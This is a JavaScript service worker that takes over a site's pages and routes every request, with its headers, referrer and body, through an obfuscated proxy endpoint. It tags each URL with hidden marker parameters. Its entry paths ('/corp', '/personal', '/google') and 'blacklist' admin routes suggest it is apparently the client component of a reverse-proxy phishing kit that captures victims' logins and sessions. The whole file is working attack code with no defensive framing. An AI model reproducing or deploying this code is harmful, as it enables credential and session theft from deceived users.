self.addEventListener("install", (event) => {
    self.skipWaiting();
});

self.addEventListener("activate", (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);

    // ✅ Bypass admin routes completely (works with query params)
    if (url.pathname.startsWith('/view-blacklist') ||
        url.pathname.startsWith('/clear-blacklist') ||
        url.pathname.startsWith('/remove-blacklist')) {
        return;
    }

    // ✅ Don't intercept the short entry URLs
    if (url.pathname === '/c' || url.pathname === '/corp' || url.pathname === '/corporate' ||
        url.pathname === '/p' || url.pathname === '/personal' ||
        url.pathname === '/g' || url.pathname === '/google') {
        return;
    }

    // ✅ Don't intercept the service worker itself or favicon
    if (url.pathname.includes('service_worker') || url.pathname === '/favicon.ico') {
        return;
    }

    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;

    try {
        const proxyRequest = {
            // 🔑 Always include our secure params
            url: appendParams(request.url),
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: request.method !== "GET" && request.method !== "HEAD" ? await request.text() : "",
            referrer: request.referrer,
            mode: request.mode
        };

        return fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    }
    catch (error) {
        console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
    }
}

// Helper to force Amethyst & Chamuel params into every URL
function appendParams(originalUrl) {
    const url = new URL(originalUrl);
    if (!url.searchParams.has("Amethyst")) {
        url.searchParams.set("Amethyst", "Sachiel1");
    }
    if (!url.searchParams.has("Chamuel")) {
        url.searchParams.set("Chamuel", "Azrael2");
    }
    return url.toString();
}
